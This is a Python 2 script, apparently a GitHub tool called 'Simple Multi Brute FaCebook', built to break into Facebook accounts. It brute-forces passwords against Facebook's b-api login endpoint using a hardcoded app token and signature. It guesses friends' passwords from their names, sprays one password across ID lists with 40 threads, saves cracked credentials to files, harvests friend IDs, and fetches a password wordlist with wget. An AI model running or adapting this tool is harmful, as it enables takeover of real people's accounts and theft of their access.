#!/usr/bin/env python
# https://github.com/zikid18
# Simple Multi Brute FaCebook
# version 1.0

# modules import
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from os import system
from time import sleep
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
import sys,random,datetime,hashlib,threading,urllib,json,mechanize,requests,cookielib
# colors
m="\033[1;31m"
p="\033[00m"
k="\033[1;33m"
h="\033[1;32m"
c="\033[1;36m"
b="\033[1;34m"
# user agent
reload(sys)
sys.setdefaultencoding('utf8')
wk = mechanize.Browser()
wk.set_handle_robots(False)
wk.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
wk.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; CPH1923 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36')]

bannerapi=("""
           \033[00m[ \033[1;31mSMFB \033[00m] \033[1;33mVersion 1.0
\033[00m        https://github.com/zikid18
\033[1;32m--------------------------------------------""")
back = 0
threads = []
id = []
berhasil = []
gagal = []
checkpoint = []
idteman = []

def token():
    token = raw_input(h+"> "+p+"Token: "+h)
    print(h+"% "+p+"Loading...")
    sleep(4)
    if token == "":
       print(m+"! "+p+"Token invalid")
       sleep(1)
       token()
    else:
        try:
            re = requests.get("https://graph.facebook.com/me?access_token="+token)
            qe = json.loads(re.text)
            os.system("mkdir cookie")
            bo = open("cookie/token.log","w")
            bo.write(token)
            bo.close()
            utama()
        except KeyError:
            print(m+"! "+p+"Token failed")
            sys.exit()


def menu():
    try:
        toket = open("cookie/token.log","r").read()
    except IOError:
        print(m+"! "+p+"Token not found")
        token()
    else:
        try:
             re = requests.get("https://graph.facebook.com/me?access_token="+toket)
             js = json.loads(re.text)
             user = js['name']
        except KeyError:
             print(k+"? "+p+"Account checkpoint")
             os.system("rm -rf cookie")
        except requests.exceptions.ConnectionError:
             print(m+"! "+p+"Please checking your connection")
             sys.exit()
    os.system("clear")
    print(bannerapi)
    print(p+"User : "+h+""+ user)
    print(h+"--------------------------------------------")
    print(h+"1 "+p+"Bruteforce target")
    print(h+"2 "+p+"Bruteforce from friends")
    print(h+"3 "+p+"Bruteforce from files")
    print(h+"4 "+p+"Dump ID friends")
    print(h+"5 "+p+"Create wordlist")
    print(h+"6 "+p+"Download wordlist")
    print(h+"7 "+p+"Donate")
    print(m+"0 "+p+"Exit")
    pilih()

def pilih():
    zik = raw_input(p+"> "+h)
    if zik == "1":
       target()
    elif zik == "2":
       temen()
    elif zik == "3":
       crack()
       hasil()
    elif zik == "4":
       dumpidteman()
    elif zik == "5":
        create()
    elif zik == "6":
        download()
    elif zik == "7":
        donasi()
    elif zik == "0":
        exit()
    else:
        print(m+"! "+p+"Choose not found")
        sleep(2)
        menu()

def donasi():
    os.system("xdg-open https://saweria.co/zikid")
    menu()
def target():
    try:
        toket = open("cookie/token.log","r").read()
    except IOError:
        print(m+"! "+p+"Token not found")
        os.system("rm -rf cookie")
    else:
         try:
              email = raw_input(k+"? "+p+"Email/ID/Phone: "+h)
              passw = raw_input(k+"? "+p+"Wordlist: "+h)
              total = open(passw,'r')
              total = total.readlines()
              print(h+"% "+p+"Target: "+h+""+ email)
              print(h+"% "+p+"Total wordlist: "+h+""+str(len(total)))
              sandi = open(passw,'r')
              for pw in sandi:
                  try:
                       pw = pw.replace('\n','')
                       sys.stdout.write("\r\033[1;31m% \033[00m"+pw)
                       sys.stdout.flush()
                       data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                       ziah = json.loads(data.text)
                       if 'access_token' in ziah:
                           print(h+"% "+p+"Login successfully")
                           print(h+"% "+p+"Username: "+h+""+ email)
                           print(h+"% "+p+"Password: "+h+""+ pw)
                           raw_input(m+"\n[ "+h+"Back "+p+"]")
                           menu()
                       else:
                           if 'www.facebook.com' in ziah['error_msg']:
                               print(k+"? "+p+"Login checkpoint")
                               print(k+"? "+p+"Username: "+k+""+email)
                               print(k+"? "+p+"Password: "+k+""+pw)
                               raw_input(p+"\n[ "+h+"Back "+p+"]")
                               menu()
                  except requests.exceptions.ConnectionError:
                        print(m+"! "+p+"Connection error")
                        exit()
         except IOError:
               print(m+"! "+p+"Wordlist not found")
               sys.exit()

def temen():
    try:
         toket = open("cookie/token.log","r").read()
    except IOError:
         print(m+"! "+p+"Token not found")
         os.system("rm -rf cookie")
         sys.exit()
    else:
        print(m+"? \033[00mGet id...")
        r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
        a = json.loads(r.text)
        for s in a['data']:
           id.append(s['id'])
        print(h+"% \033[00mTotal id: "+h+""+str(len(id)))
        print(h+"% \033[00mPlease wait to crack")
        print(h+"----------------------")
        def main(arg):
            user = arg
            try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print h+'% '+p+'OK: '+user+' - '+ pass1
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print k+'? '+p+'CP: '+user+' - '+ pass1
                    else:
                         pass2 = b['first_name'] + '12345'
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
                             print h+'% '+p+'OK: '+user+' - '+ pass2
                         else:
                              if 'www.facebook.com' in q['error_msg']:
                                  print k+"? "+p+"CP: "+user+" - "+ pass2
                              else:
                                   pass3 = b['last_name'] + '123'
                                   data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                   q = json.load(data)
                                   if 'access_token' in q:
                                       print(h+"% "+p+"OK: "+user+" - "+pass3)
                                   else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print(k+"? "+p+"CP: "+user+" - "+ pass3)
                                        else:
                                             pass4 = ('sayang123','sayang12345678')
                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                             q = json.load(data)
                                             if 'access_token' in q:
                                                 print h+"% "+p+"OK: "+user+" - "+ pass4
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
                                                    print k+"? "+p+"CP: "+user+" - "+ pass4
            except:
               pass

    p = ThreadPool(30)
    p.map(main, id)
    print(b+"* "+p+"Done")
    raw_input(p+"[ "+h+"Back "+p+"]")
    menu()

def crack():
    global file
    global idlist
    global passw
    try:
         toket = open("cookie/token.log","r").read()
    except IOError:
         print(m+"! "+p+"Token not found")
         os.system("rm -rf token")
         exit()
    else:
         idlist = raw_input(k+"? "+p+"Idlist: "+h)
         passw = raw_input(k+"? "+p+"Password: "+h)
         try:
             file = open(idlist,'r')
             for x in range(40):
                 zik = threading.Thread(target=scrak, args=())
                 zik.start()
                 threads.append(zik)
             for zik in threads:
                 zik.join()
         except IOError:
             print(m+"! "+p+"Idlist not found")
             raw_input(p+"[ "+m+"Back "+p+"]")
             menu()

def scrak():
    global back,berhasil,gagal,checkpoint,up
    try:
        buka = open(idlist,'r')
        up = buka.read().split()
        while file:
             username = file.readline().strip()
             url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
             data = urllib.urlopen(url)
             ziah = json.load(data)
             if back == len(up):
                break
             if 'access_token' in ziah:
                 bisa = open("vuln.txt","w")
                 bisa.write(username+" - "+passw)
                 bisa.close()
                 berhasil.append("\n\033[1;32m% \033[00mOK: "+username+" - "+passw)
                 back += 1
             else:
                  if 'www.facebook.com' in ziah['error_msg']:
                      chek = open("checkpoint.txt","w")
                      chek.write(username+" - "+ passw)
                      chek.close()
                      checkpoint.append("\033[1;33m? \033[00mCP: "+username+" - "+ passw)
                      back += 1
                  else:
                        gagal.append(username)
                        back += 1
             sys.stdout.write("\r\033[1;31m? \033[00mCrack: \033[1;32m"+str(back)+" \033[1;31m"+str(len(up))+" \033[00mFound: \033[1;32m"+str(len(berhasil))+" \033[00mCheck: \033[1;33m"+str(len(checkpoint)))
             sys.stdout.flush()
    except IOError:
          print(m+"! "+p+"ID list not found")
          sys.exit()
    except requests.exceptions.ConnectionError:
          print(m+"! "+p+"Connection error")
          sys.exit()

def hasil():
    for b in berhasil:
        print b
    for c in checkpoint:
        print c
    print(m+"! "+p+"Total failed: \033[1;32m"+str(len(gagal)))
    sys.exit()

def dumpidteman():
    try:
        toket = open("cookie/token.log","r").read()
    except IOError:
        print(m+"! Token not found")
        os.system("rm -rf cookie")
    else:
        try:
            r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
            a = json.loads(r.text)
            seve = raw_input(k+"? "+p+"Seved id: "+h)
            bz = open(seve, 'w')
            print(m+"! "+p+"Please wait...")
            print 40*"\033[1;32m-"
            for zik in a['data']:
                idteman.append(zik['id'])
                bz.write(zik['id']+"\n")
                print("\r\033[1;32m> \033[00mName: \033[1;32m"+zik['name'])
                print("\033[1;32m> \033[00mID: \033[1;32m"+zik['id'])
                print 40* h+"-"
            print("\n\r\033[1;32m> \033[00mTotal: \033[1;32m%s" % len(idteman))
            print("\033[1;32m% \033[00mSeved it: \033[1;32m"+ seve)
            bz.close()
            raw_input("\n\033[00m[ \033[1;32mBack \033[00m]")
            menu()
        except IOError:
              print(m+"! "+p+"Please checking create files")
              sys.exit()
        except (KeyboardInterrupt, EOFError):
              print(m+"! "+p+"Stooped")
              sys.exit()

def create():
    files = raw_input(k+"? "+p+"Name files: "+h)
    sim = open(files, 'w')
    jumlah = int(input(k+"? "+p+"Total wordlist: "+h))
    jmlh = jumlah + 1
    for x in range(1, jmlh):
        wordlist = raw_input(k+"? "+p+"List password \033[1;32m"+str(x)+""+p+": "+h)
        sim.write(wordlist+"\n")
    sim.close()
    print("\033[1;32m% \033[00mSeved it: \033[1;32m"+ files)
    raw_input("\033[00m[ \033[1;32mBack \033[00m]")
    menu()

def download():
    name = raw_input(k+"? "+p+"Name files: \033[1;32m")
    os.system("wget -O "+name+" https://raw.githubusercontent.com/berandal666/Passwords/master/hak5.txt > /dev/null 2>&1")
    print(h+"% "+p+"Seved it: \033[1;32m"+name)
    raw_input("\033[00m[ \033[1;32mBack \033[00m]")
    menu()

def utama():
    os.system("clear")
    print(bannerapi)
    print(h+"1 "+p+"Go to menu")
    print(h+"2 "+p+"Login")
    print(h+"3 "+p+"Logout")
    print(m+"0 "+p+"Exit")
    pil = raw_input(p+"> "+h)
    if pil == "1":
       menu()
    elif pil == "2":
       token()
    elif pil == "3":
       logout()
    elif pil == "0":
       exit()
    else:
        print(m+"! "+p+"Choose not found")
        sleep(1)
        utama()
log1="log987"
log2="log765"
log3="log543"
log4="log321"

def logout():
    code = [log1,log2,log3,log4]
    code = random.choice(code)
    print(m+"% "+p+"Please type "+h+""+code+" "+p+"to logout")
    out = raw_input(p+"> "+h)
    if out == code:
       os.system("rm -rf cookie")
       print(h+"% "+p+"Successfully")
    else:
        print(m+'! '+p+'Code invalid')
        logout()

if __name__ == '__main__':
     try:
          utama()
     except KeyboardInterrupt:
          exit()
     except EOFError:
          exit()

